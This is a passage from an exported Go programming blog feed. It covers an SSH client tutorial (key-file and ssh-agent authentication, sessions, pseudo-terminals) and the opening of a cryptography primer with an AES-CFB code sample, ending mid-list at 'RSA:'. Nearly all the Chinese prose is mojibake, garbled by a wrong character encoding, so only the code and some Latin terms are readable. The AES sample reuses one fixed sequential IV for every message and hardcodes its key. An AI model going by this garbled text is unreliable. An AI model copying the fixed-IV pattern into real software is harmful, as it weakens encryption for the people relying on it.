‰ªéÁßòÈí•Êñá‰ª∂‰∏≠ËØªÂèñÂíåssh-agent‰∏≠ËØªÂèñ„ÄÇ ÁßÅÈí•Êñá‰ª∂ËØªÂèñÁßÅÈí•Êñá‰ª∂, ÁÑ∂Âêé‰ΩøÁî®ssh.PublicKeysÊñπÊ≥ï Ëé∑Âèñ‰∏Ä‰∏™AuthMethodÊé•Âè£ÂØπË±°, ËøôÈáåÊàëÂÜçÊ¨°Â∞ÅË£Ö‰∫Ü‰∏ã, ÈÄöËøáPublicKeyFileÂèØ‰ª•Áõ¥Êé•Ëé∑Âèñ‰∏Ä‰∏™ÂÖ¨Èí•ÁöÑAuthMethodÊé•Âè£„ÄÇ12345678910111213141516171819func PublicKeyFile(file string) ssh.AuthMethod &#123; buffer, err := ioutil.ReadFile(file) if err != nil &#123; return nil &#125; key, err := ssh.ParsePrivateKey(buffer) if err != nil &#123; return nil &#125; return ssh.PublicKeys(key)&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; PublicKeyFile("/path/to/your/pub/certificate/key") &#125;,&#125; SSH AgentSSH Agent ÊòØ‰∏Ä‰∏™*nixÁ≥ªÁªüÈáåÈù¢ÁöÑÂ∑•ÂÖ∑, ‰ªñÂ∞ÜÁî®Êà∑ÁßÅÈí•‰øùÂ≠òÂú®‰∏ÄÂº†Âä†ÂØÜÁöÑË°®‰∏≠, ‰∏∫‰∫ÜÈÅøÂÖçÂëΩ‰ª§Ë°åÁöÑÂèÇÊï∞‰º†ÂÖ•, ÂæàÂ§öÁî®Êà∑ËøòÊòØÊÑøÊÑèÂ∞Ü‰ªñ‰ª¨ÁöÑÁßòÈí•‰∫§Áªôssh agentÁÆ°ÁêÜ„ÄÇ‰∏∫‰∫ÜËÉΩËé∑ÂèñÂà∞‰Ω†Â≠òÂÇ®Âú®ssh agent‰∏≠ÁöÑÁßÅÈí•, ‰Ω†È¶ñÂÖàÁöÑÂ∞Ü‰Ω†ÁöÑÁßÅÈí•Êèê‰∫§Áªôssh agent‰øùÁÆ°,ÊâßË°åÂ¶Ç‰∏ãÂëΩ‰ª§:1$ ssh-add /path/to/your/private/certificate/file Êàë‰ª¨ÂèØ‰ª•ÈÄöËøásocket(net.Dial)ËÆøÈóÆÂà∞ÈáåÈù¢Â≠òÂÇ®ÁöÑÁßÅÈí•, ÁÑ∂Âêé‰ΩøÁî®Â∑•ÂéÇÂáΩÊï∞ssh.PublicKeysCallbackÊù•ÂàõÂª∫‰∏Ä‰∏™ssh agentÁöÑAuthMethodÂÆû‰æã„ÄÇ12345678910111213func SSHAgent() ssh.AuthMethod &#123; if sshAgent, err := net.Dial("unix", os.Getenv("SSH_AUTH_SOCK")); err == nil &#123; return ssh.PublicKeysCallback(agent.NewClient(sshAgent).Signers) &#125; return nil&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; SSHAgent() &#125;,&#125; Âª∫Á´ãÈìæÊé•ÂΩìÊàë‰ª¨ÈÄöËøássh.ClientConfigÂØπË±°ËÆæÁΩÆÂ•ΩsshÁöÑÈÖçÁΩÆËøáÂêé, Êàë‰ª¨Â∞±ÂèØ‰ª•Ë∞ÉÁî®ssh.DialÊñπÊ≥ïÊù•Âª∫Á´ã‰∏Ä‰∏™sshËøûÊé•‰∫Ü1234connection, err := ssh.Dial("tcp", "host:port", sshConfig)if err != nil &#123; return nil, fmt.Errorf("Failed to dial: %s", err)&#125; ÂàõÂª∫ÂõûËØù‰∏é‰∫§Êç¢ÂΩìsshËøûÊé•Âª∫Á´ãËøáÂêé, Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáËøô‰∏™ËøûÊé•Âª∫Á´ã‰∏Ä‰∏™ÂõûËØù, Âú®ÂõûËØù‰∏äÂíåËøúÁ®ã‰∏ªÊú∫ÈÄö‰ø°„ÄÇ1234session, err := connection.NewSession()if err != nil &#123; return nil, fmt.Errorf("Failed to create session: %s", err)&#125; ‰ΩÜÊòØÈÄö‰ø°‰πãÂâçÊàë‰ª¨ÈúÄË¶ÅËØ∑Ê±ÇÂú®ËøúÁ®ã‰∏ªÊú∫‰∏äÂàõÂª∫‰∏Ä‰∏™‰º™ÁªàÁ´Ø(ptyÂÖ®Áß∞pseudo terminal), ÁÆÄÂçïËØ¥Êù•ptyÊòØ‰∏ÄÂØπÂ≠óÁ¨¶ËÆæÂ§á, Êèê‰æõ‰∏Ä‰∏™ÂèåÂêëÊ≤üÈÄöÁöÑÊ∏†ÈÅìÔºåÂ§ßÊ¶ÇËøáÁ®ãÊòØËøôÊ†∑(pty master &lt;‚Äîsession‚Äî&gt; pty slave), ÂÖ≥‰∫éÂØπptyÁöÑÊõ¥ËØ¶Â∞ΩÁöÑ‰ªãÁªçÂèØ‰ª•ÂèÇËÄÉTTYÁöÑÈÇ£‰∫õ‰∫ãÂÑø12345678910modes := ssh.TerminalModes&#123; ssh.ECHO: 0, // disable echoing ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud&#125;if err := session.RequestPty("xterm", 80, 40, modes); err != nil &#123; session.Close() return nil, fmt.Errorf("request for pseudo terminal failed: %s", err)&#125; ËøúÁ®ã‰∏ªÊú∫ÂºÄÂêØptyÁªàÁ´ØËøáÂêé, Êàë‰ª¨Â∞±ÂèØ‰ª•Áõ¥Êé•ÈÄöËøáRunÂèëÈÄÅÂëΩ‰ª§‰∫Ü, ËøôÈáåÊàë‰ª¨ÈÄöËøáSetenvËÆæÁΩÆsessionÁöÑÁéØÂ¢ÉÂèòÈáè, sessionÊâßË°åÁöÑÁªìÊûúÈÄöËøáStdout, StderrËøîÂõû, ËøôÈáå‰ΩøÁî®‰∏Ä‰∏™BufferÊù•‰øùÂ≠òËøô‰∫õÁªìÊûú„ÄÇ123456789if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error())&#125;var b bytes.Buffersession.Stdout, session.Stderr = &amp;b, &amp;bif err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error())&#125; Â¶ÇÊûúÊàë‰ª¨‰ΩøÁî®ShellÊ®°ÂºèÁöÑËØù, Êàë‰ª¨ÈúÄË¶ÅÂú®ptmx‰∏äÂàõÂª∫‰∏Ä‰∏™terminal, ËøôÊ†∑ÂØπ‰ªñÁöÑÊìç‰ΩúÊâç‰ºöÂèçÂ∫îÂà∞pts‰∏ä ,Â§ßÊ¶ÇÁöÑÂéüÁêÜÊòØËøôÊ†∑: ssh&lt;---&gt;/dev/ptmx(master)&lt;---&gt;pts/*(slave)&lt;---&gt;getty‰∏∫‰∫ÜËØ¥Ê∏ÖÊ•öÂéüÁêÜ, ÊàëÂºïÁî®‰∫ÜÂà´‰∫∫ÁöÑËØù,Â∏åÊúõËÉΩÊñπ‰æø‰Ω†ÁêÜËß£: Â¶ÇÊûúÊüê‰∫∫Âú®ÁΩë‰∏ä‰ΩøÁî®telnetÁ®ãÂ∫èËøûÊé•Âà∞‰Ω†ÁöÑËÆ°ÁÆóÊú∫‰∏äÔºåÂàôtelnetÁ®ãÂ∫èÂ∞±ÂèØËÉΩ‰ºöÊâìÂºÄ/dev/ptmxËÆæÂ§áËé∑Âèñ‰∏Ä‰∏™fd„ÄÇÊ≠§Êó∂‰∏Ä‰∏™gettyÁ®ãÂ∫èÂ∞±Â∫îËØ•ËøêË°åÂú®ÂØπÂ∫îÁöÑ/dev/pts/‰∏ä„ÄÇÂΩìtelnet‰ªéËøúÁ´ØËé∑Âèñ‰∫Ü‰∏Ä‰∏™Â≠óÁ¨¶Êó∂ÔºåËØ•Â≠óÁ¨¶Â∞±‰ºöÈÄöËøáptmx„ÄÅpts/‰º†ÈÄíÁªô gettyÁ®ãÂ∫èÔºåËÄågettyÁ®ãÂ∫èÂ∞±‰ºöÈÄöËøápts/*„ÄÅptmxÂíåtelnetÁ®ãÂ∫èÂæÄÁΩëÁªú‰∏äËøîÂõû‚Äúlogin:‚ÄùÂ≠óÁ¨¶‰∏≤‰ø°ÊÅØ„ÄÇËøôÊ†∑ÔºåÁôªÂΩïÁ®ãÂ∫è‰∏ételnetÁ®ãÂ∫èÂ∞±ÈÄöËøá‰º™ÁªàÁ´ØËøõË°åÈÄö‰ø°„ÄÇ 123456789101112131415161718session.Stdout = os.Stdoutsession.Stderr = os.Stderrsession.Stdin = os.Stdinmodes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400,&#125;termFD := int(os.Stdin.Fd())w, h, _ := terminal.GetSize(termFD)termState, _ := terminal.MakeRaw(termFD)defer terminal.Restore(termFD, termState)err = session.RequestPty("xterm-256color", h, w, modes)ce(err, "request pty") ÊÄªÁªìÂÖ∂ÂÆûTTYÊòØ‰∏Ä‰∏™ÂæàÂ§ßÂæàÁªèÂÖ∏ÁöÑËØùÈ¢ò, ÂêéÈù¢ÂÅöWeb TerminalÊó∂, ËøòÂæó‰ΩøÁî®xtermËøôÁßçÁ±ªÂûãÁöÑpty, Áî±‰∫éÁØáÂπÖÊúâÈôê, Ê≤°ÊúâÂ±ïÂºÄ, ‰ª•ÂêéË°•‰∏ä„ÄÇ]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂØÜÁ†ÅÂ≠¶ÁÆÄ‰ªã‰∏éGolangÁöÑÂä†ÂØÜÂ∫ìCryptoÁöÑ‰ΩøÁî®]]></title>
    <url>%2F2017%2F02%2F19%2Fgo-crypto%2F</url>
    <content type="text"><![CDATA[ÊçÆËÆ∞ËΩΩÔºåÂÖ¨ÂÖÉÂâç400Âπ¥ÔºåÂè§Â∏åËÖä‰∫∫ÂèëÊòé‰∫ÜÁΩÆÊç¢ÂØÜÁ†Å„ÄÇ1881Âπ¥‰∏ñÁïå‰∏äÁöÑÁ¨¨‰∏Ä‰∏™ÁîµËØù‰øùÂØÜ‰∏ìÂà©Âá∫Áé∞„ÄÇÂú®Á¨¨‰∫åÊ¨°‰∏ñÁïåÂ§ßÊàòÊúüÈó¥ÔºåÂæ∑ÂõΩÂÜõÊñπÂêØÁî®‚ÄúÊÅ©Â∞ºÊ†ºÁéõ‚ÄùÂØÜÁ†ÅÊú∫ÔºåÂØÜÁ†ÅÂ≠¶Âú®Êàò‰∫â‰∏≠Ëµ∑ÁùÄÈùûÂ∏∏ÈáçË¶ÅÁöÑ‰ΩúÁî®, ËøôÊÆµÂéÜÂè≤ÂæàÊúâË∂£,Âª∫ËÆÆÁúãÁúãÊÅ©Ê†ºÁéõÊú∫Á†¥Ëß£ÂéÜÂè≤„ÄÇÈöèÁùÄ‰ø°ÊÅØÂåñÂíåÊï∞Â≠óÂåñÁ§æ‰ºöÁöÑÂèëÂ±ïÔºå‰∫∫‰ª¨ÂØπ‰ø°ÊÅØÂÆâÂÖ®Âíå‰øùÂØÜÁöÑÈáçË¶ÅÊÄßËÆ§ËØÜ‰∏çÊñ≠ÊèêÈ´òÔºå‰∫éÊòØÂú®1997Âπ¥ÔºåÁæéÂõΩÂõΩÂÆ∂Ê†áÂáÜÂ±ÄÂÖ¨Â∏ÉÂÆûÊñΩ‰∫Ü‚ÄúÁæéÂõΩÊï∞ÊçÆÂä†ÂØÜÊ†áÂáÜÔºàDESÔºâ‚ÄùÔºåÊ∞ëÈó¥ÂäõÈáèÂºÄÂßãÂÖ®Èù¢‰ªãÂÖ•ÂØÜÁ†ÅÂ≠¶ÁöÑÁ†îÁ©∂ÂíåÂ∫îÁî®‰∏≠ÔºåÈááÁî®ÁöÑÂä†ÂØÜÁÆóÊ≥ïÊúâDES„ÄÅRSA„ÄÅSHAÁ≠â„ÄÇÈöèÁùÄÂØπÂä†ÂØÜÂº∫Â∫¶ÈúÄÊ±ÇÁöÑ‰∏çÊñ≠ÊèêÈ´òÔºåËøëÊúüÂèàÂá∫Áé∞‰∫ÜAES„ÄÅECCÁ≠â„ÄÇ ÂØÜÁ†ÅÂ≠¶ÁöÑÁõÆÁöÑ ‰øùÂØÜÊÄßÔºöÈò≤Ê≠¢Áî®Êà∑ÁöÑÊ†áËØÜÊàñÊï∞ÊçÆË¢´ËØªÂèñ„ÄÇ Êï∞ÊçÆÂÆåÊï¥ÊÄßÔºöÈò≤Ê≠¢Êï∞ÊçÆË¢´Êõ¥Êîπ„ÄÇ Ë∫´‰ªΩÈ™åËØÅÔºöÁ°Æ‰øùÊï∞ÊçÆÂèëËá™ÁâπÂÆöÁöÑ‰∏ÄÊñπ„ÄÇ ÂØÜÁ†ÅÂ≠¶ÁöÑÂ∫îÁî®ÈöèÁùÄÂØÜÁ†ÅÂ≠¶ÂïÜ‰∏öÂ∫îÁî®ÁöÑÊôÆÂèäÔºåÂÖ¨Èí•ÂØÜÁ†ÅÂ≠¶ÂèóÂà∞ÂâçÊâÄÊú™ÊúâÁöÑÈáçËßÜ„ÄÇÈô§‰º†ÁªüÁöÑÂØÜÁ†ÅÂ∫îÁî®Á≥ªÁªüÂ§ñÔºåPKIÁ≥ªÁªü‰ª•ÂÖ¨Èí•ÂØÜÁ†ÅÊäÄÊúØ‰∏∫‰∏ªÔºåÊèê‰æõÂä†ÂØÜ„ÄÅÁ≠æÂêç„ÄÅËÆ§ËØÅ„ÄÅÂØÜÈí•ÁÆ°ÁêÜ„ÄÅÂàÜÈÖçÁ≠âÂäüËÉΩ„ÄÇ ‰øùÂØÜÈÄö‰ø°Ôºö‰øùÂØÜÈÄö‰ø°ÊòØÂØÜÁ†ÅÂ≠¶‰∫ßÁîüÁöÑÂä®Âõ†„ÄÇ‰ΩøÁî®ÂÖ¨ÁßÅÈí•ÂØÜÁ†Å‰ΩìÂà∂ËøõË°å‰øùÂØÜÈÄö‰ø°Êó∂Ôºå‰ø°ÊÅØÊé•Êî∂ËÄÖÂè™ÊúâÁü•ÈÅìÂØπÂ∫îÁöÑÂØÜÈí•ÊâçÂèØ‰ª•Ëß£ÂØÜËØ•‰ø°ÊÅØ„ÄÇ Êï∞Â≠óÁ≠æÂêçÔºöÊï∞Â≠óÁ≠æÂêçÊäÄÊúØÂèØ‰ª•‰ª£Êõø‰º†ÁªüÁöÑÊâãÂÜôÁ≠æÂêçÔºåËÄå‰∏î‰ªéÂÆâÂÖ®ÁöÑËßíÂ∫¶ËÄÉËôëÔºåÊï∞Â≠óÁ≠æÂêçÂÖ∑ÊúâÂæàÂ•ΩÁöÑÈò≤‰º™ÈÄ†ÂäüËÉΩ„ÄÇÂú®ÊîøÂ∫úÊú∫ÂÖ≥„ÄÅÂÜõ‰∫ãÈ¢ÜÂüü„ÄÅÂïÜ‰∏öÈ¢ÜÂüüÊúâÂπøÊ≥õÁöÑÂ∫îÁî®ÁéØÂ¢É„ÄÇ ÁßòÂØÜÂÖ±‰∫´ÔºöÁßòÂØÜÂÖ±‰∫´ÊäÄÊúØÊòØÊåáÂ∞Ü‰∏Ä‰∏™ÁßòÂØÜ‰ø°ÊÅØÂà©Áî®ÂØÜÁ†ÅÊäÄÊúØÂàÜÊãÜÊàên‰∏™Áß∞‰∏∫ÂÖ±‰∫´Âõ†Â≠êÁöÑ‰ø°ÊÅØÔºåÂàÜÂèëÁªôn‰∏™ÊàêÂëòÔºåÂè™Êúâk(k‚â§n)‰∏™ÂêàÊ≥ïÊàêÂëòÁöÑÂÖ±‰∫´Âõ†Â≠êÊâçÂèØ‰ª•ÊÅ¢Â§çËØ•ÁßòÂØÜ‰ø°ÊÅØÔºåÂÖ∂‰∏≠‰ªª‰Ωï‰∏Ä‰∏™Êàñm(m‚â§k)‰∏™ÊàêÂëòÂêà‰ΩúÈÉΩ‰∏çÁü•ÈÅìËØ•ÁßòÂØÜ‰ø°ÊÅØ„ÄÇÂà©Áî®ÁßòÂØÜÂÖ±‰∫´ÊäÄÊúØÂèØ‰ª•ÊéßÂà∂‰ªª‰ΩïÈúÄË¶ÅÂ§ö‰∏™‰∫∫ÂÖ±ÂêåÊéßÂà∂ÁöÑÁßòÂØÜ‰ø°ÊÅØ„ÄÅÂëΩ‰ª§Á≠â„ÄÇ ËÆ§ËØÅÂäüËÉΩÔºöÂú®ÂÖ¨ÂºÄÁöÑ‰ø°ÈÅì‰∏äËøõË°åÊïèÊÑü‰ø°ÊÅØÁöÑ‰º†ËæìÔºåÈááÁî®Á≠æÂêçÊäÄÊúØÂÆûÁé∞ÂØπÊ∂àÊÅØÁöÑÁúüÂÆûÊÄß„ÄÅÂÆåÊï¥ÊÄßËøõË°åÈ™åËØÅÔºåÈÄöËøáÈ™åËØÅÂÖ¨Èí•ËØÅ‰π¶ÂÆûÁé∞ÂØπÈÄö‰ø°‰∏ª‰ΩìÁöÑË∫´‰ªΩÈ™åËØÅ„ÄÇ ÂØÜÈí•ÁÆ°ÁêÜÔºöÂØÜÈí•ÊòØ‰øùÂØÜÁ≥ªÁªü‰∏≠Êõ¥‰∏∫ËÑÜÂº±ËÄåÈáçË¶ÅÁöÑÁéØËäÇÔºåÂÖ¨Èí•ÂØÜÁ†Å‰ΩìÂà∂ÊòØËß£ÂÜ≥ÂØÜÈí•ÁÆ°ÁêÜÂ∑•‰ΩúÁöÑÊúâÂäõÂ∑•ÂÖ∑ÔºõÂà©Áî®ÂÖ¨Èí•ÂØÜÁ†Å‰ΩìÂà∂ËøõË°åÂØÜÈí•ÂçèÂïÜÂíå‰∫ßÁîüÔºå‰øùÂØÜÈÄö‰ø°ÂèåÊñπ‰∏çÈúÄË¶Å‰∫ãÂÖàÂÖ±‰∫´ÁßòÂØÜ‰ø°ÊÅØÔºõÂà©Áî®ÂÖ¨Èí•ÂØÜÁ†Å‰ΩìÂà∂ËøõË°åÂØÜÈí•ÂàÜÂèë„ÄÅ‰øùÊä§„ÄÅÂØÜÈí•ÊâòÁÆ°„ÄÅÂØÜÈí•ÊÅ¢Â§çÁ≠â„ÄÇ Âä†ÂØÜÁÆóÊ≥ï‰ªãÁªçÊ†πÊçÆÂØÜÈí•Á±ªÂûã‰∏çÂêåÂ∞ÜÁé∞‰ª£ÂØÜÁ†ÅÊäÄÊúØÂàÜ‰∏∫‰∏§Á±ªÔºö ÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ï: Âä†ÂØÜÂíåËß£ÂØÜÂùáÈááÁî®Âêå‰∏ÄÊääÁßòÂØÜÈí•Âåô„ÄÇ ÈùûÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ï: Êúâ2ÊääÂØÜÈí•,ÂÖ¨Èí•ÂíåÁßÅÈí•, ÂÖ¨Èí•Âä†ÂØÜ, ÁßÅÈí•Ëß£ÂØÜ„ÄÇ ÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ïÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ïÁî®Êù•ÂØπÊïèÊÑüÊï∞ÊçÆÁ≠â‰ø°ÊÅØËøõË°åÂä†ÂØÜÔºåÂ∏∏Áî®ÁöÑÁÆóÊ≥ïÂåÖÊã¨Ôºö DES(Data Encryption Standard): Êï∞ÊçÆÂä†ÂØÜÊ†áÂáÜÔºåÈÄüÂ∫¶ËæÉÂø´ÔºåÈÄÇÁî®‰∫éÂä†ÂØÜÂ§ßÈáèÊï∞ÊçÆÁöÑÂú∫Âêà„ÄÇ 3DES(Triple DES): ÊòØÂü∫‰∫éDESÔºåÂØπ‰∏ÄÂùóÊï∞ÊçÆÁî®‰∏â‰∏™‰∏çÂêåÁöÑÂØÜÈí•ËøõË°å‰∏âÊ¨°Âä†ÂØÜÔºåÂº∫Â∫¶Êõ¥È´ò„ÄÇ AES(Advanced Encryption Standard): È´òÁ∫ßÂä†ÂØÜÊ†áÂáÜÔºåÊòØ‰∏ã‰∏Ä‰ª£ÁöÑÂä†ÂØÜÁÆóÊ≥ïÊ†áÂáÜÔºåÈÄüÂ∫¶Âø´ÔºåÂÆâÂÖ®Á∫ßÂà´È´òÔºõ AES2000Âπ¥10ÊúàÔºåNIST(ÁæéÂõΩÂõΩÂÆ∂Ê†áÂáÜÂíåÊäÄÊúØÂçè‰ºö)ÂÆ£Â∏ÉÈÄöËøá‰ªé15Áßç‰æØÈÄâÁÆóÊ≥ï‰∏≠ÈÄâÂá∫ÁöÑ‰∏ÄÈ°πÊñ∞ÁöÑÂØÜÂåôÂä†ÂØÜÊ†áÂáÜ„ÄÇRijndaelË¢´ÈÄâ‰∏≠Êàê‰∏∫Â∞ÜÊù•ÁöÑAES„ÄÇ RijndaelÊòØÂú®1999Âπ¥‰∏ãÂçäÂπ¥ÔºåÁî±Á†îÁ©∂ÂëòJoan DaemenÂíåVincent RijmenÂàõÂª∫ÁöÑ„ÄÇAESÊ≠£Êó•ÁõäÊàê‰∏∫Âä†ÂØÜÂêÑÁßçÂΩ¢ÂºèÁöÑÁîµÂ≠êÊï∞ÊçÆÁöÑÂÆûÈôÖÊ†áÂáÜ„ÄÇÂπ∂‰∫é2002Âπ¥5Êúà26Êó•Âà∂ÂÆö‰∫ÜÊñ∞ÁöÑÈ´òÁ∫ßÂä†ÂØÜÊ†áÂáÜ (AES) ËßÑËåÉ„ÄÇÁÆóÊ≥ïÂéüÁêÜ AESÁÆóÊ≥ïÂü∫‰∫éÊéíÂàóÂíåÁΩÆÊç¢ËøêÁÆó„ÄÇÊéíÂàóÊòØÂØπÊï∞ÊçÆÈáçÊñ∞ËøõË°åÂÆâÊéíÔºåÁΩÆÊç¢ÊòØÂ∞Ü‰∏Ä‰∏™Êï∞ÊçÆÂçïÂÖÉÊõøÊç¢‰∏∫Âè¶‰∏Ä‰∏™„ÄÇAES ‰ΩøÁî®Âá†Áßç‰∏çÂêåÁöÑÊñπÊ≥ïÊù•ÊâßË°åÊéíÂàóÂíåÁΩÆÊç¢ËøêÁÆó„ÄÇAESÊòØ‰∏Ä‰∏™Ëø≠‰ª£ÁöÑ„ÄÅÂØπÁß∞ÂØÜÈí•ÂàÜÁªÑÁöÑÂØÜÁ†ÅÔºåÂÆÉÂèØ‰ª•‰ΩøÁî®128„ÄÅ192 Âíå 256 ‰ΩçÂØÜÈí•ÔºåÂπ∂‰∏îÁî® 128 ‰ΩçÔºà16Â≠óËäÇÔºâÂàÜÁªÑÂä†ÂØÜÂíåËß£ÂØÜÊï∞ÊçÆ„ÄÇ‰∏éÂÖ¨ÂÖ±ÂØÜÈí•ÂØÜÁ†Å‰ΩøÁî®ÂØÜÈí•ÂØπ‰∏çÂêåÔºåÂØπÁß∞ÂØÜÈí•ÂØÜÁ†Å‰ΩøÁî®Áõ∏ÂêåÁöÑÂØÜÈí•Âä†ÂØÜÂíåËß£ÂØÜÊï∞ÊçÆ„ÄÇÈÄöËøáÂàÜÁªÑÂØÜÁ†ÅËøîÂõûÁöÑÂä†ÂØÜÊï∞ÊçÆÁöÑ‰ΩçÊï∞‰∏éËæìÂÖ•Êï∞ÊçÆÁõ∏Âêå„ÄÇËø≠‰ª£Âä†ÂØÜ‰ΩøÁî®‰∏Ä‰∏™Âæ™ÁéØÁªìÊûÑÔºåÂú®ËØ•Âæ™ÁéØ‰∏≠ÈáçÂ§çÁΩÆÊç¢ÂíåÊõøÊç¢ËæìÂÖ•Êï∞ÊçÆ„ÄÇ DESDESÂÖ®Áß∞‰∏∫Data Encryption StandardÔºåÂç≥Êï∞ÊçÆÂä†ÂØÜÊ†áÂáÜÔºåÊòØ‰∏ÄÁßç‰ΩøÁî®ÂØÜÈí•Âä†ÂØÜÁöÑÂùóÁÆóÊ≥ïÔºå1977Âπ¥Ë¢´ÁæéÂõΩËÅîÈÇ¶ÊîøÂ∫úÁöÑÂõΩÂÆ∂Ê†áÂáÜÂ±ÄÁ°ÆÂÆö‰∏∫ËÅîÈÇ¶ËµÑÊñôÂ§ÑÁêÜÊ†áÂáÜÔºàFIPSÔºâÔºåÂπ∂ÊéàÊùÉÂú®ÈùûÂØÜÁ∫ßÊîøÂ∫úÈÄö‰ø°‰∏≠‰ΩøÁî®ÔºåÈöèÂêéËØ•ÁÆóÊ≥ïÂú®ÂõΩÈôÖ‰∏äÂπøÊ≥õÊµÅ‰º†ÂºÄÊù•„ÄÇ AES‰∏é3DESÁöÑÊØîËæÉ ÁÆóÊ≥ïÂêçÁß∞ ÁÆóÊ≥ïÁ±ªÂûã ÂØÜÈí•ÈïøÂ∫¶ ÈÄüÂ∫¶ Ëß£ÂØÜÊó∂Èó¥ÔºàÂª∫ËÆæÊú∫Âô®ÊØèÁßíÂ∞ùËØï255‰∏™ÂØÜÈí•Ôºâ ËµÑÊ∫êÊ∂àËÄó AES ÂØπÁß∞blockÂØÜÁ†Å 128„ÄÅ192„ÄÅ256‰Ωç È´ò 1490000‰∫øÂπ¥ ‰Ωé 3DES ÂØπÁß∞feistelÂØÜÁ†Å 112‰ΩçÊàñ168‰Ωç ‰Ωé 46‰∫øÂπ¥ ‰∏≠ Á†¥Ëß£ÂéÜÂè≤ÂéÜÂè≤‰∏äÊúâ‰∏âÊ¨°ÂØπDESÊúâÂΩ±ÂìçÁöÑÊîªÂáªÂÆûÈ™å„ÄÇ1997Âπ¥ÔºåÂà©Áî®ÂΩìÊó∂ÂêÑÂõΩ 7‰∏áÂè∞ËÆ°ÁÆóÊú∫ÔºåÂéÜÊó∂96Â§©Á†¥Ëß£‰∫ÜDESÁöÑÂØÜÈí•„ÄÇ1998Âπ¥ÔºåÁîµÂ≠êËæπÂ¢ÉÂü∫Èáë‰ºöÔºàEFFÔºâÁî®25‰∏áÁæéÂÖÉÂà∂ÈÄ†ÁöÑ‰∏ìÁî®ËÆ°ÁÆóÊú∫ÔºåÁî®56Â∞èÊó∂Á†¥Ëß£‰∫ÜDESÁöÑÂØÜÈí•„ÄÇ1999Âπ¥ÔºåEFFÁî®22Â∞èÊó∂15ÂàÜÂÆåÊàê‰∫ÜÁ†¥Ëß£Â∑•‰Ωú„ÄÇÂõ†Ê≠§„ÄÇÊõæÁªèÊúâËøáÂçìË∂äË¥°ÁåÆÁöÑDES‰πü‰∏çËÉΩÊª°Ë∂≥Êàë‰ª¨Êó•ÁõäÂ¢ûÈïøÁöÑÈúÄÊ±Ç‰∫Ü„ÄÇ ‰ª£Á†ÅÁ§∫‰æãÁªº‰∏äÁúãÊù•AESÂÆâÂÖ®Â∫¶ÊúÄÈ´ò, Âü∫Êú¨Áé∞Áä∂Â∞±ÊòØAESÂ∑≤ÁªèÊõø‰ª£DESÊàê‰∏∫Êñ∞‰∏Ä‰ª£ÂØπÁß∞Âä†ÂØÜÁöÑÊ†áÂáÜ, ‰∏ãÈù¢ÊòØGolang‰∏≠AES‰ΩøÁî®ÁöÑÊ†óÂ≠ê12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package mainimport ( "crypto/aes" "crypto/cipher" "fmt")var commonIV = []byte&#123;0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f&#125;func encrypt(plainText string, keyText string) (cipherByte []byte, err error) &#123; // ËΩ¨Êç¢ÊàêÂ≠óËäÇÊï∞ÊçÆ, Êñπ‰æøÂä†ÂØÜ plainByte := []byte(plainText) keyByte := []byte(keyText) // ÂàõÂª∫Âä†ÂØÜÁÆóÊ≥ïaes c, err := aes.NewCipher(keyByte) if err != nil &#123; return nil, err &#125; //Âä†ÂØÜÂ≠óÁ¨¶‰∏≤ cfb := cipher.NewCFBEncrypter(c, commonIV) cipherByte = make([]byte, len(plainByte)) cfb.XORKeyStream(cipherByte, plainByte) return&#125;func decrypt(cipherByte []byte, keyText string) (plainText string, err error) &#123; // ËΩ¨Êç¢ÊàêÂ≠óËäÇÊï∞ÊçÆ, Êñπ‰æøÂä†ÂØÜ keyByte := []byte(keyText) // ÂàõÂª∫Âä†ÂØÜÁÆóÊ≥ïaes c, err := aes.NewCipher(keyByte) if err != nil &#123; return "", err &#125; // Ëß£ÂØÜÂ≠óÁ¨¶‰∏≤ cfbdec := cipher.NewCFBDecrypter(c, commonIV) plainByte := make([]byte, len(cipherByte)) cfbdec.XORKeyStream(plainByte, cipherByte) plainText = string(plainByte) return&#125;func main() &#123; plain := "The text need to be encrypt." // AES ËßÑÂÆöÊúâ3ÁßçÈïøÂ∫¶ÁöÑkey: 16, 24, 32ÂàÜÂà´ÂØπÂ∫îAES-128, AES-192, or AES-256 key := "abcdefgehjhijkmlkjjwwoew" // Âä†ÂØÜ cipherByte, err := encrypt(plain, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%s ==&gt; %x\n", plain, cipherByte) // Ëß£ÂØÜ plainText, err := decrypt(cipherByte, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%x ==&gt; %s\n", cipherByte, plainText)&#125; ÈùûÂØπÁß∞ÁÆóÊ≥ïÈùûÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ïÂ∏∏Áî®‰∫éÊï∞ÊçÆÂä†ÂØÜÂíåË∫´‰ªΩËÆ§ËØÅ, Â∏∏ËßÅÁöÑÈùûÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ïÂ¶Ç‰∏ãÔºö RSA: 